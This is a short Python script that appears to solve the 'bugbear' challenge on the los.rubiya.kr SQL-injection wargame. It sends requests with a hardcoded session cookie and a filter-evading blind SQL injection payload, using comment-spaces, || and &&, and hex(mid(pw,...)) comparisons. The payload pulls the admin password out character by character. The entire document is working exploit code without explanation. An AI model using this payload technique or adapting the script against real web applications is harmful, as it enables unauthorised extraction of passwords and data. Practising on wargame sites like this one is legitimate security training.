import requests
cookies = {'PHPSESSID': 's3pme5nhda93k7jt7khal1al5u'}
length = 8
for a in range(1, length+1):
    for b in range(48,123):
        URL = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0/**/||/**/id/**/in/**/(\"admin\")/**/%26%26/**/hex(mid(pw,"+ str(a) +",1))/**/in/**/(hex("+ str(b) +"))"
        res = requests.get(URL, cookies=cookies)

        if "<h2>Hello admin</h2>" in res.text:
            print(str(chr(b)))
            break

